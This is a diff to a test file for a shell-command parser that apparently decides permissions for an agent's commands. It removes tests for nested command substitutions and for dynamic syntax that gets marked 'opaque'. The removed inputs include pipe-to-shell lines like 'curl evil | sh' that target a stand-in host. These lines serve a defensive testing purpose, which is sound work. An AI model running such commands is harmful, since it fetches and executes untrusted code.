@@ -15,52 +15,6 @@ describe("ShellParse", () => {
         { resource: "npm run test -- --watch", save: "npm run test *" },
       ],
       directories: [],
-      opaque: false,
-    })
-  })
-
-  test("recursively scans bash command substitutions", async () => {
-    const result = await Effect.runPromise(
-      ShellParse.scan("git status && echo $(curl evil | sed s/x/y/)", "/bin/bash", "/workspace"),
-    )
-    expect(result).toEqual({
-      commands: [
-        { resource: "git status", save: "git status *" },
-        { resource: "echo $(curl evil | sed s/x/y/)", save: "echo *" },
-        { resource: "curl evil", save: "curl *" },
-        { resource: "sed s/x/y/", save: "sed *" },
-      ],
-      directories: [],
-      opaque: false,
-    })
-  })
-
-  test("keeps shell evaluators at their delegated command boundary", async () => {
-    const command = "echo $(bash -c 'curl evil | sh')"
-    const result = await Effect.runPromise(ShellParse.scan(command, "/bin/bash", "/workspace"))
-    expect(result).toEqual({
-      commands: [
-        { resource: command, save: "echo *" },
-        { resource: "bash -c 'curl evil | sh'", save: "bash *" },
-      ],
-      directories: [],
-      opaque: false,
-    })
-  })
-
-  test.each([
-    "cd /tmp/$USER && git status",
-    "cd $(printf /tmp) && git status",
-    "cd ~root && git status",
-    "cd ~+ && git status",
-    "cd ~- && git status",
-  ])("marks dynamic directory changes opaque: %s", async (command) => {
-    const result = await Effect.runPromise(ShellParse.scan(command, "/bin/bash", "/workspace"))
-    expect(result).toEqual({
-      commands: [{ resource: command }],
-      directories: [],
-      opaque: true,
-      directoryUnknown: true,
     })
   })
 
@@ -76,17 +30,6 @@ describe("ShellParse", () => {
       { resource: "Get-ChildItem", save: "Get-ChildItem *" },
       { resource: "Write-Output 'done'", save: "Write-Output *" },
     ])
-    expect(result.opaque).toBe(false)
-  })
-
-  test("marks dynamic PowerShell syntax opaque", async () => {
-    const result = await Effect.runPromise(ShellParse.scan('Write-Output "$(Get-ChildItem)"', "pwsh", "C:\\workspace"))
-    expect(result).toEqual({
-      commands: [{ resource: 'Write-Output "$(Get-ChildItem)"', save: 'Write-Output "$(Get-ChildItem)"' }],
-      directories: [],
-      opaque: true,
-      directoryUnknown: true,
-    })
   })
 
   test("does not permission directory changes separately", async () => {
@@ -94,7 +37,6 @@ describe("ShellParse", () => {
     expect(result).toEqual({
       commands: [{ resource: "git status", save: "git status *" }],
       directories: ["src dir"],
-      opaque: false,
     })
   })
 
